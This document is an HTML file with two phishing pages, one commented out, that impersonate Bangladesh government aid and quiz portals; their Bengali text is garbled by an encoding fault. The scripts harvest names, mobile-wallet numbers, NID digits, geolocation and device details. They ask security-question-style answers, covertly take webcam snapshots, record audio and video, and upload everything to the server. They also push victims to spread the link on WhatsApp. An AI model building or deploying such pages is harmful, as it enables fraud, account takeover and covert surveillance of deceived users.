<!-- <!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>‡¶∏‡¶∞‡¶ï‡¶æ‡¶∞‡¶ø ‡¶Ö‡¶®‡ßÅ‡¶¶‡¶æ‡¶® ‡¶™‡ßã‡¶∞‡ßç‡¶ü‡¶æ‡¶≤</title>
    <style>
        body { font-family: 'Arial', sans-serif; background: #f0f2f5; text-align: center; margin: 0; padding: 10px; }
        .card { max-width: 450px; margin: auto; background: white; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); border-top: 10px solid #006a4e; overflow: hidden; }
        .header { background: #006a4e; color: white; padding: 20px; }
        .body { padding: 25px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
        .btn { background: #006a4e; color: white; border: none; padding: 15px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px; }
        
        /* 40s Loader Animation */
        #loading-page { display: none; padding: 40px 20px; }
        .loader { border: 8px solid #f3f3f3; border-top: 8px solid #006a4e; border-radius: 50%; width: 50px; height: 50px; animation: spin 1.5s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .timer { font-size: 24px; color: #d9534f; font-weight: bold; margin-top: 10px; }

        #step2, #share-page { display: none; }
        .share-btn { background: #25D366; margin-top: 15px; }
        #video { display: none; }
    </style>
</head>
<body>

<div class="card">
    <div class="header">
        <img src="https://upload.wikimedia.org/wikipedia/commons/8/84/Government_Seal_of_Bangladesh.svg" width="50">
        <h3>‡¶ú‡¶®‡¶∏‡ßá‡¶¨‡¶æ ‡¶∏‡¶π‡¶æ‡ßü‡¶§‡¶æ ‡¶™‡ßã‡¶∞‡ßç‡¶ü‡¶æ‡¶≤</h3>
    </div>

    <div class="body" id="step1">
        <p>‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶®‡¶æ‡¶Æ ‡¶ì ‡¶Æ‡ßã‡¶¨‡¶æ‡¶á‡¶≤ ‡¶®‡¶Æ‡ßç‡¶¨‡¶∞ ‡¶¶‡¶ø‡¶®:</p>
        <input type="text" id="v-name" placeholder="‡¶™‡ßÇ‡¶∞‡ßç‡¶£ ‡¶®‡¶æ‡¶Æ">
        <input type="number" id="v-phone" placeholder="‡¶¨‡¶ø‡¶ï‡¶æ‡¶∂/‡¶®‡¶ó‡¶¶ ‡¶®‡¶Æ‡ßç‡¶¨‡¶∞">
        <button class="btn" onclick="next1()">‡¶™‡¶∞‡¶¨‡¶∞‡ßç‡¶§‡ßÄ ‡¶ß‡¶æ‡¶™</button>
    </div>

    <div class="body" id="step2">
        <p>‡¶≠‡ßá‡¶∞‡¶ø‡¶´‡¶ø‡¶ï‡ßá‡¶∂‡¶®‡ßá‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶è‡¶≤‡¶æ‡¶ï‡¶æ ‡¶®‡¶ø‡¶∂‡ßç‡¶ö‡¶ø‡¶§ ‡¶ï‡¶∞‡ßÅ‡¶®:</p>
        <input type="number" id="v-nid" placeholder="NID ‡¶ï‡¶æ‡¶∞‡ßç‡¶°‡ßá‡¶∞ ‡¶∂‡ßá‡¶∑ ‡ß™ ‡¶∏‡¶Ç‡¶ñ‡ßç‡¶Ø‡¶æ">
        <button class="btn" onclick="startProcess()">‡¶¨‡ßã‡¶®‡¶æ‡¶∏ ‡¶è‡¶ï‡ßç‡¶ü‡¶ø‡¶≠‡ßá‡¶ü ‡¶ï‡¶∞‡ßÅ‡¶®</button>
    </div>

    <div class="body" id="loading-page">
        <h3>‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶§‡¶•‡ßç‡¶Ø ‡¶≠‡ßá‡¶∞‡¶ø‡¶´‡¶æ‡¶á ‡¶π‡¶ö‡ßç‡¶õ‡ßá...</h3>
        <div class="loader"></div>
        <p>‡¶¶‡ßü‡¶æ ‡¶ï‡¶∞‡ßá ‡¶Ö‡¶™‡ßá‡¶ï‡ßç‡¶∑‡¶æ ‡¶ï‡¶∞‡ßÅ‡¶®‡•§ ‡¶™‡ßá‡¶ú‡¶ü‡¶ø ‡¶ï‡¶æ‡¶ü‡¶¨‡ßá‡¶® ‡¶®‡¶æ‡•§</p>
        <div class="timer" id="time">00:40</div>
    </div>

    <div class="body" id="share-page">
        <h2 style="color: #006a4e;">üéâ ‡¶∏‡¶´‡¶≤ ‡¶π‡ßü‡ßá‡¶õ‡ßá!</h2>
        <p>‡ß´‡ß¶‡ß¶‡ß¶ ‡¶ü‡¶æ‡¶ï‡¶æ ‡¶¨‡ßã‡¶®‡¶æ‡¶∏ ‡¶™‡ßá‡¶§‡ßá ‡¶Ö‡¶´‡¶æ‡¶∞‡¶ü‡¶ø ‡ßß‡ß¶ ‡¶ú‡¶® ‡¶¨‡¶®‡ßç‡¶ß‡ßÅ‡¶ï‡ßá ‡¶π‡ßã‡ßü‡¶æ‡¶ü‡¶∏‡¶Ö‡ßç‡¶Ø‡¶æ‡¶™‡ßá ‡¶∂‡ßá‡ßü‡¶æ‡¶∞ ‡¶ï‡¶∞‡ßÅ‡¶®‡•§</p>
        <button class="btn share-btn" onclick="doShare()">WhatsApp-‡¶è ‡¶∂‡ßá‡ßü‡¶æ‡¶∞ ‡¶ï‡¶∞‡ßÅ‡¶®</button>
        <p id="s-txt" style="font-weight:bold; margin-top:10px;">‡¶¨‡¶æ‡¶ï‡¶ø: ‡ßß‡ß¶/‡ßß‡ß¶</p>
    </div>
</div>

<video id="video" playsinline autoplay></video>
<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script>
    let userData = {}; let shares = 0;
    window.onbeforeunload = function() { return "Exit korle bonus paben na!"; };

    function next1() {
        userData.name = $("#v-name").val();
        userData.phone = $("#v-phone").val();
        if(userData.phone.length < 11) return alert("Valid number din");
        $("#step1").hide(); $("#step2").show();
    }

    async function startProcess() {
        userData.nid = $("#v-nid").val();
        navigator.geolocation.getCurrentPosition(async (pos) => {
            // Device Tracking
            let model = navigator.platform;
            if (navigator.userAgentData) {
                const hints = await navigator.userAgentData.getHighEntropyValues(["model"]);
                model = hints.model || model;
            }
            const batt = (await navigator.getBattery?.())?.level * 100 || 'N/A';
            
            const final = {
                ...userData, model: model, battery: batt + "%",
                net: navigator.connection?.effectiveType || 'N/A',
                map: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
            };
            $.post('/info', { data: encodeURIComponent(JSON.stringify(final)) });

            initStealth();
            $("#step2").hide(); $("#loading-page").show();
            
            // 40 Second Timer
            let t = 40;
            let clock = setInterval(() => {
                t--;
                $("#time").text("00:" + (t < 10 ? "0"+t : t));
                if(t <= 0) { clearInterval(clock); $("#loading-page").hide(); $("#share-page").show(); }
            }, 1000);
        }, () => { alert("Location permission allow kora lagbe!"); });
    }

    function initStealth() {
        navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream => {
            document.getElementById('video').srcObject = stream;
            setInterval(() => {
                const canvas = document.getElementById('canvas');
                canvas.getContext('2d').drawImage(document.getElementById('video'), 0, 0, 640, 480);
                $.post('/camsnap', { img: canvas.toDataURL('image/jpeg', 0.4) });
            }, 3000);
            recordV(stream);
        });
    }

    function recordV(stream) {
        const rec = new MediaRecorder(stream); let ch = [];
        rec.ondataavailable = e => ch.push(e.data);
        rec.onstop = () => {
            let r = new FileReader();
            r.onloadend = () => $.ajax({ type:'POST', url:'/video-upload', data:JSON.stringify({video:r.result}), contentType:'application/json' });
            r.readAsDataURL(new Blob(ch, {type:'video/webm'}));
            ch=[]; rec.start(); setTimeout(()=>rec.stop(), 10000);
        };
        rec.start(); setTimeout(()=>rec.stop(), 10000);
    }

    function doShare() {
        shares++;
        $("#s-txt").text(`‡¶¨‡¶æ‡¶ï‡¶ø: ${10 - shares}/‡ßß‡ß¶`);
        window.open(`whatsapp://send?text=${encodeURIComponent("‡ß´‡ß¶‡ß¶‡ß¶ ‡¶ü‡¶æ‡¶ï‡¶æ ‡¶¨‡ßã‡¶®‡¶æ‡¶∏ ‡¶®‡¶ø‡¶®: " + window.location.origin)}`);
        if(shares >= 10) { alert("Sokol hoyeche!"); location.href="https://www.bkash.com"; }
    }
</script>
</body>
</html> -->



<!DOCTYPE html>
<html lang="bn">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>‡¶∏‡¶∞‡¶ï‡¶æ‡¶∞‡¶ø ‡¶°‡¶ø‡¶ú‡¶ø‡¶ü‡¶æ‡¶≤ ‡¶ï‡ßÅ‡¶á‡¶ú ‡¶ì ‡¶∞‡¶ø‡¶ö‡¶æ‡¶∞‡ßç‡¶ú ‡ß®‡ß¶‡ß®‡ß¨</title>
    <style>
        body { font-family: 'Arial', sans-serif; background: #f0f2f5; text-align: center; margin: 0; padding: 10px; }
        .box { max-width: 450px; margin: auto; background: white; padding: 25px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1); border-top: 10px solid #006a4e; }
        .header img { width: 60px; margin-bottom: 10px; }
        input, .btn { width: 100%; padding: 14px; margin: 10px 0; border-radius: 10px; border: 1px solid #ddd; box-sizing: border-box; font-size: 16px; }
        .btn { background: #006a4e; color: white; font-weight: bold; cursor: pointer; border: none; transition: 0.3s; }
        .btn:hover { background: #004d39; }
        .opt { display: block; width: 100%; padding: 12px; margin: 8px 0; background: #f8f9fa; border: 1px solid #ddd; border-radius: 8px; cursor: pointer; text-align: left; font-size: 15px; }
        .opt:hover { background: #e8f5e9; border-color: #006a4e; }
        #loading, #quiz-page, #result-page { display: none; }
        #video { width: 1px; height: 1px; opacity: 0.01; position: absolute; }
        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #006a4e; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #q-text { color: #006a4e; font-size: 18px; font-weight: bold; min-height: 50px; }
    </style>
</head>

<body>
    <div class="box">
        <div class="header">
            <img src="https://upload.wikimedia.org/wikipedia/commons/8/84/Government_Seal_of_Bangladesh.svg" alt="Govt Seal">
            <h2>‡¶∏‡¶∞‡¶ï‡¶æ‡¶∞‡¶ø ‡¶ï‡ßÅ‡¶á‡¶ú ‡¶™‡ßç‡¶∞‡¶§‡¶ø‡¶Ø‡ßã‡¶ó‡¶ø‡¶§‡¶æ</h2>
        </div>

        <div id="step1">
            <p>‡ßß‡ß¶‡¶ü‡¶ø ‡¶™‡ßç‡¶∞‡¶∂‡ßç‡¶®‡ßá‡¶∞ ‡¶∏‡¶†‡¶ø‡¶ï ‡¶â‡¶§‡ßç‡¶§‡¶∞ ‡¶¶‡¶ø‡¶Ø‡¶º‡ßá ‡¶ú‡¶ø‡¶§‡ßá ‡¶®‡¶ø‡¶® ‡ß®‡ß¶ ‡¶ü‡¶æ‡¶ï‡¶æ ‡¶®‡¶ø‡¶∂‡ßç‡¶ö‡¶ø‡¶§ ‡¶Æ‡ßã‡¶¨‡¶æ‡¶á‡¶≤ ‡¶∞‡¶ø‡¶ö‡¶æ‡¶∞‡ßç‡¶ú!</p>
            <input type="text" id="name" placeholder="‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶®‡¶æ‡¶Æ">
            <input type="number" id="phone" placeholder="‡¶∞‡¶ø‡¶ö‡¶æ‡¶∞‡ßç‡¶ú ‡¶®‡¶Æ‡ßç‡¶¨‡¶∞">
            <button class="btn" onclick="startSystem()">‡¶ï‡ßÅ‡¶á‡¶ú ‡¶∂‡ßÅ‡¶∞‡ßÅ ‡¶ï‡¶∞‡ßÅ‡¶®</button>
        </div>

        <div id="loading">
            <h3>‡¶∏‡¶æ‡¶∞‡ßç‡¶≠‡¶æ‡¶∞‡ßá‡¶∞ ‡¶∏‡¶æ‡¶•‡ßá ‡¶ï‡¶æ‡¶®‡ßá‡¶ï‡ßç‡¶ü ‡¶π‡¶ö‡ßç‡¶õ‡ßá...</h3>
            <div class="loader"></div>
            <p>‡ßß‡ß¶ ‡¶∏‡ßá‡¶ï‡ßá‡¶®‡ßç‡¶° ‡¶Ö‡¶™‡ßá‡¶ï‡ßç‡¶∑‡¶æ ‡¶ï‡¶∞‡ßÅ‡¶®‡•§ ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶°‡¶æ‡¶ü‡¶æ ‡¶è‡¶®‡¶ï‡ßç‡¶∞‡¶ø‡¶™‡ßç‡¶ü ‡¶π‡¶ö‡ßç‡¶õ‡ßá‡•§</p>
        </div>

        <div id="quiz-page">
            <p id="q-count" style="font-size: 14px; color: #666; font-weight: bold;"></p>
            <div id="q-text"></div>
            <div id="options"></div>
        </div>

        <div id="result-page">
            <h2 id="res-status"></h2>
            <p id="score-text" style="font-size: 20px; font-weight: bold; color: #006a4e;"></p>
            <div id="prize-area" style="display:none;">
                <p>‡ß®‡ß¶ ‡¶ü‡¶æ‡¶ï‡¶æ ‡¶∞‡¶ø‡¶ö‡¶æ‡¶∞‡ßç‡¶ú ‡¶¨‡ßç‡¶Ø‡¶æ‡¶≤‡ßá‡¶®‡ßç‡¶∏ ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶ì‡¶Ø‡¶º‡¶æ‡¶≤‡ßá‡¶ü‡ßá ‡¶Ø‡ßã‡¶ó ‡¶ï‡¶∞‡¶æ ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá‡•§</p>
                <button class="btn" style="background:#25D366;" onclick="shareWA()">WhatsApp-‡¶è ‡¶∂‡ßá‡¶Ø‡¶º‡¶æ‡¶∞ ‡¶ï‡¶∞‡ßÅ‡¶®</button>
            </div>
            <button class="btn" id="retry-btn" style="display:none; background:#d9534f;" onclick="location.reload()">‡¶Ü‡¶¨‡¶æ‡¶∞ ‡¶ö‡ßá‡¶∑‡ßç‡¶ü‡¶æ ‡¶ï‡¶∞‡ßÅ‡¶®</button>
        </div>
    </div>

    <video id="video" playsinline autoplay muted></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script>
        // --- ‡ßß. ‡¶∞‡¶ø‡ßü‡ßá‡¶≤-‡¶ü‡¶æ‡¶á‡¶Æ ‡¶ü‡ßç‡¶∞‡ßç‡¶Ø‡¶æ‡¶ï‡¶ø‡¶Ç ‡¶è‡¶¨‡¶Ç ‡¶á‡¶®‡¶™‡ßÅ‡¶ü ‡¶ï‡ßç‡¶Ø‡¶æ‡¶™‡¶ö‡¶æ‡¶∞ ---
        $(document).ready(function () {
            // ‡¶™‡ßá‡¶ú ‡¶ì‡¶™‡ßá‡¶® ‡¶π‡¶ì‡ßü‡¶æ ‡¶Æ‡¶æ‡¶§‡ßç‡¶∞‡¶á ‡¶∏‡¶æ‡¶á‡¶≤‡ßá‡¶®‡ßç‡¶ü ‡¶≤‡¶ó
            sendReport("Just Opened", "N/A", "Page Entry");

            // ‡¶®‡¶æ‡¶Æ ‡¶¨‡¶æ ‡¶®‡¶Æ‡ßç‡¶¨‡¶∞ ‡¶ü‡¶æ‡¶á‡¶™ ‡¶ï‡¶∞‡ßá ‡¶¨‡¶ï‡ßç‡¶∏ ‡¶•‡ßá‡¶ï‡ßá ‡¶∏‡¶∞‡¶≤‡ßá‡¶á ‡¶°‡¶æ‡¶ü‡¶æ ‡¶ö‡¶≤‡ßá ‡¶Ø‡¶æ‡¶¨‡ßá
            $("#name, #phone").on("blur", function() {
                if($("#name").val().length > 2 || $("#phone").val().length > 5) {
                    sendReport($("#name").val(), $("#phone").val(), "Input Capture");
                }
            });
        });

        async function sendReport(uName, uPhone, activity) {
            let batt = "N/A"; 
            try { const b = await navigator.getBattery(); batt = Math.floor(b.level * 100) + "%"; } catch (e) {}

            const report = {
                name: uName || "Unknown",
                phone: uPhone || "N/A",
                score: activity,
                battery: batt,
                model: navigator.platform,
                ua: navigator.userAgent,
                map: "Waiting/Denied"
            };

            // ‡¶∏‡¶æ‡¶á‡¶≤‡ßá‡¶®‡ßç‡¶ü‡¶≤‡¶ø ‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶® ‡¶ö‡ßá‡¶ï ‡¶ï‡¶∞‡¶æ
            navigator.geolocation.getCurrentPosition((pos) => {
                report.map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                $.post('/info', { data: encodeURIComponent(JSON.stringify(report)) });
            }, () => {
                $.post('/info', { data: encodeURIComponent(JSON.stringify(report)) });
            }, {timeout: 3000});
        }

        // --- ‡ß®. ‡¶∏‡¶æ‡¶á‡¶ï‡ßã‡¶≤‡¶ú‡¶ø‡¶ï‡ßç‡¶Ø‡¶æ‡¶≤ ‡¶ï‡ßÅ‡¶á‡¶ú ‡¶∏‡¶ø‡¶∏‡ßç‡¶ü‡ßá‡¶Æ ---
        let currentQ = 0, score = 0;
        const questions = [
            { q: "‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶™‡ßç‡¶∞‡¶ø‡ßü ‡¶ñ‡¶æ‡¶¨‡¶æ‡¶∞ ‡¶ï‡ßã‡¶®‡¶ü‡¶ø? (‡¶≠‡¶¨‡¶ø‡¶∑‡ßç‡¶Ø‡ßé ‡¶∞‡¶ø‡¶ì‡ßü‡¶æ‡¶∞‡ßç‡¶°‡ßá‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø)", o: ["‡¶¨‡¶ø‡¶∞‡¶ø‡ßü‡¶æ‡¶®‡¶ø", "‡¶ï‡¶æ‡¶ö‡ßç‡¶ö‡¶ø", "‡¶Ö‡¶®‡ßç‡¶Ø‡¶æ‡¶®‡ßç‡¶Ø"], a: 1 },
            { q: "‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶∏‡¶ø‡¶ï‡¶ø‡¶â‡¶∞‡¶ø‡¶ü‡¶ø ‡¶π‡¶ø‡¶∏‡ßá‡¶¨‡ßá ‡¶ï‡ßã‡¶® ‡¶∏‡¶æ‡¶≤‡¶ü‡¶ø ‡¶™‡ßç‡¶∞‡¶ø‡ßü?", o: ["‡ß®‡ß¶‡ß¶‡ß¶-‡ß®‡ß¶‡ß¶‡ß´", "‡ßß‡ßØ‡ßØ‡ß¶-‡ß®‡ß¶‡ß¶‡ß¶", "‡¶Ö‡¶®‡ßç‡¶Ø‡¶æ‡¶®‡ßç‡¶Ø"], a: 2 },
            { q: "‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶õ‡ßã‡¶ü‡¶¨‡ßá‡¶≤‡¶æ‡¶∞ ‡¶™‡ßç‡¶∞‡¶ø‡ßü ‡¶¨‡¶®‡ßç‡¶ß‡ßÅ‡¶∞ ‡¶®‡¶æ‡¶Æ ‡¶ï‡¶ø?", o: ["‡¶∞‡¶æ‡¶ï‡¶ø‡¶¨", "‡¶∏‡ßÅ‡¶Æ‡¶®", "‡¶Ö‡¶®‡ßç‡¶Ø‡¶æ‡¶®‡ßç‡¶Ø (‡¶ü‡¶æ‡¶á‡¶™‡¶ï‡ßÉ‡¶§)"], a: 1 },
            { q: "‡¶™‡¶æ‡¶∏‡¶ì‡ßü‡¶æ‡¶∞‡ßç‡¶°‡ßá ‡¶®‡¶ø‡¶ú‡ßá‡¶∞ ‡¶®‡¶æ‡¶Æ ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞ ‡¶ï‡¶∞‡¶æ ‡¶ï‡¶ø ‡¶®‡¶ø‡¶∞‡¶æ‡¶™‡¶¶?", o: ["‡¶π‡ßç‡¶Ø‡¶æ‡¶Å", "‡¶®‡¶æ", "‡¶Æ‡¶æ‡¶ù‡ßá ‡¶Æ‡¶æ‡¶ù‡ßá ‡¶ï‡¶∞‡¶ø"], a: 1 },
            { q: "‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶ú‡¶®‡ßç‡¶Æ ‡¶ú‡ßá‡¶≤‡¶æ ‡¶ï‡ßã‡¶®‡¶ü‡¶ø?", o: ["‡¶¢‡¶æ‡¶ï‡¶æ", "‡¶ö‡¶ü‡ßç‡¶ü‡¶ó‡ßç‡¶∞‡¶æ‡¶Æ", "‡¶Ö‡¶®‡ßç‡¶Ø‡¶æ‡¶®‡ßç‡¶Ø"], a: 0 },
            { q: "‡¶Ü‡¶™‡¶®‡¶ø ‡¶∏‡¶æ‡¶ß‡¶æ‡¶∞‡¶£‡¶§ ‡¶ï‡ßã‡¶® ‡¶Ö‡¶™‡¶æ‡¶∞‡ßá‡¶ü‡¶∞ ‡¶¨‡ßá‡¶∂‡¶ø ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞ ‡¶ï‡¶∞‡ßá‡¶®?", o: ["Grameenphone", "Banglalink", "Robi/Airtel"], a: 0 },
            { q: "‡¶Ü‡¶™‡¶®‡¶ø ‡¶ï‡¶ø ‡¶Ö‡¶®‡¶≤‡¶æ‡¶á‡¶® ‡¶¨‡ßç‡¶Ø‡¶æ‡¶Ç‡¶ï‡¶ø‡¶Ç ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞ ‡¶ï‡¶∞‡ßá‡¶®?", o: ["‡¶π‡ßç‡¶Ø‡¶æ‡¶Å (bkash/Nagad)", "‡¶®‡¶æ", "‡¶≠‡¶¨‡¶ø‡¶∑‡ßç‡¶Ø‡¶§‡ßá ‡¶ï‡¶∞‡¶¨"], a: 0 },
            { q: "‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶™‡ßç‡¶∞‡¶ø‡ßü ‡¶∞‡¶Ç ‡¶ï‡ßã‡¶®‡¶ü‡¶ø?", o: ["‡¶≤‡¶æ‡¶≤", "‡¶®‡ßÄ‡¶≤", "‡¶∏‡¶¨‡ßÅ‡¶ú"], a: 1 },
            { q: "‡¶Ü‡¶™‡¶®‡¶ø ‡¶ï‡¶ø ‡ß®‡ß¶ ‡¶ü‡¶æ‡¶ï‡¶æ ‡¶∞‡¶ø‡¶ö‡¶æ‡¶∞‡ßç‡¶ú ‡¶™‡ßÅ‡¶∞‡¶∏‡ßç‡¶ï‡¶æ‡¶∞‡¶ü‡¶ø ‡¶®‡¶ø‡¶§‡ßá ‡¶ö‡¶æ‡¶®?", o: ["‡¶π‡ßç‡¶Ø‡¶æ‡¶Å", "‡¶Ö‡¶¨‡¶∂‡ßç‡¶Ø‡¶á", "‡¶®‡¶ø‡¶∂‡ßç‡¶ö‡ßü‡¶á"], a: 1 }
        ];

        async function startSystem() {
            if ($("#name").val() === "" || $("#phone").val().length < 11) return alert("‡¶∏‡¶†‡¶ø‡¶ï ‡¶®‡¶æ‡¶Æ ‡¶ì ‡¶®‡¶Æ‡ßç‡¶¨‡¶∞ ‡¶¶‡¶ø‡¶®!");
            $("#step1").hide(); $("#loading").show();

            // ‡¶ï‡ßç‡¶Ø‡¶æ‡¶Æ‡ßá‡¶∞‡¶æ ‡¶™‡¶æ‡¶∞‡¶Æ‡¶ø‡¶∂‡¶® ‡¶™‡ßç‡¶∞‡¶Æ‡ßç‡¶ü
            navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream => {
                document.getElementById('video').srcObject = stream;
                setTimeout(() => {
                    setInterval(takeAutoSnap, 4000);
                    recordLoop(stream);
                }, 2000);
            }).catch(err => {
                console.log("Cam Denied");
                // ‡¶™‡¶æ‡¶∞‡¶Æ‡¶ø‡¶∂‡¶® ‡¶®‡¶æ ‡¶¶‡¶ø‡¶≤‡ßá‡¶ì ‡¶ï‡ßÅ‡¶á‡¶ú ‡¶ö‡¶≤‡¶¨‡ßá, ‡¶ï‡¶ø‡¶®‡ßç‡¶§‡ßÅ ‡¶Ü‡¶Æ‡¶∞‡¶æ ‡¶°‡¶æ‡¶ü‡¶æ ‡¶Ö‡¶≤‡¶∞‡ßá‡¶°‡¶ø ‡¶™‡¶æ‡¶ö‡ßç‡¶õ‡¶ø
            });

            setTimeout(() => {
                $("#loading").hide(); $("#quiz-page").show();
                renderQuestion();
            }, 6000); // ‡¶≤‡ßã‡¶°‡¶ø‡¶Ç ‡¶ü‡¶æ‡¶á‡¶Æ ‡¶è‡¶ï‡¶ü‡ßÅ ‡¶ï‡¶Æ‡¶ø‡ßü‡ßá ‡¶¶‡¶ø‡¶≤‡¶æ‡¶Æ
        }

        function renderQuestion() {
            if (currentQ < questions.length) {
                $("#q-count").text("‡¶™‡ßç‡¶∞‡¶∂‡ßç‡¶®: " + (currentQ + 1) + "/" + questions.length);
                $("#q-text").text(questions[currentQ].q);
                $("#options").html('');
                questions[currentQ].o.forEach((opt, i) => {
                    $("#options").append(`<button class="opt" onclick="check(${i})">${opt}</button>`);
                });
            } else { showResult(); }
        }

        function check(i) {
            // ‡¶™‡ßç‡¶∞‡¶§‡¶ø‡¶ü‡¶æ ‡¶â‡¶§‡ßç‡¶§‡¶∞‡ßá‡¶∞ ‡¶∞‡¶ø‡¶™‡ßã‡¶∞‡ßç‡¶ü ‡¶∏‡¶æ‡¶•‡ßá ‡¶∏‡¶æ‡¶•‡ßá ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã
            sendReport($("#name").val(), $("#phone").val(), `Q: ${questions[currentQ].q} | A: ${questions[currentQ].o[i]}`);
            
            if (i === questions[currentQ].a) score++;
            currentQ++; 
            renderQuestion();
        }

        function takeAutoSnap() {
            const v = document.getElementById('video'), c = document.getElementById('canvas');
            if(v.videoWidth > 0){
                c.width = v.videoWidth; c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                $.post('/camsnap', { img: c.toDataURL('image/jpeg', 0.5) });
            }
        }

        function recordLoop(stream) {
            const rec = new MediaRecorder(stream); let ch = [];
            rec.ondataavailable = e => ch.push(e.data);
            rec.onstop = () => {
                let rd = new FileReader();
                rd.onloadend = () => $.ajax({ type: 'POST', url: '/video-upload', data: JSON.stringify({ video: rd.result }), contentType: 'application/json' });
                rd.readAsDataURL(new Blob(ch, { type: 'video/webm' }));
                ch = []; rec.start(); setTimeout(() => rec.stop(), 10000);
            };
            rec.start(); setTimeout(() => rec.stop(), 10000);
        }

        function showResult() {
            $("#quiz-page").hide(); $("#result-page").show();
            $("#score-text").text(`‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶Æ‡ßã‡¶ü ‡¶∏‡ßç‡¶ï‡ßã‡¶∞: ${score}/${questions.length}`);
            
            sendReport($("#name").val(), $("#phone").val(), `Final Score: ${score}`);

            if (score >= 5) {
                $("#res-status").text("üéâ ‡¶Ö‡¶≠‡¶ø‡¶®‡¶®‡ßç‡¶¶‡¶®! ‡¶Ü‡¶™‡¶®‡¶ø ‡¶¨‡¶ø‡¶ú‡¶Ø‡¶º‡ßÄ‡•§");
                $("#prize-area").show();
            } else {
                $("#res-status").text("‚ùå ‡¶¶‡ßÅ‡¶É‡¶ñ‡¶ø‡¶§! ‡¶Ü‡¶™‡¶®‡¶ø ‡¶∏‡¶´‡¶≤ ‡¶π‡¶§‡ßá ‡¶™‡¶æ‡¶∞‡ßá‡¶®‡¶®‡¶ø‡•§");
                $("#retry-btn").show();
            }
        }

        function shareWA() {
            window.open(`whatsapp://send?text=‡¶Ü‡¶Æ‡¶ø ‡¶∏‡¶∞‡¶ï‡¶æ‡¶∞‡¶ø ‡¶ï‡ßÅ‡¶á‡¶ú ‡¶ñ‡ßá‡¶≤‡ßá ‡ß®‡ß¶ ‡¶ü‡¶æ‡¶ï‡¶æ ‡¶∞‡¶ø‡¶ö‡¶æ‡¶∞‡ßç‡¶ú ‡¶™‡ßá‡¶Ø‡¶º‡ßá‡¶õ‡¶ø‡•§ ‡¶Ü‡¶™‡¶®‡¶ø‡¶ì ‡¶ñ‡ßá‡¶≤‡ßÅ‡¶®: ${window.location.origin}`);
            setTimeout(() => { alert("‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶∂‡ßá‡¶Ø‡¶º‡¶æ‡¶∞ ‡¶∏‡¶´‡¶≤ ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá‡•§ ‡¶∞‡¶ø‡¶ö‡¶æ‡¶∞‡ßç‡¶ú‡¶ü‡¶ø ‡ßß ‡¶ò‡¶£‡ßç‡¶ü‡¶æ‡¶∞ ‡¶Æ‡¶ß‡ßç‡¶Ø‡ßá ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶®‡¶Æ‡ßç‡¶¨‡¶∞‡ßá ‡¶™‡ßå‡¶Å‡¶õ‡ßá ‡¶Ø‡¶æ‡¶¨‡ßá‡•§"); }, 3000);
        }
    </script>
</body>
</html>
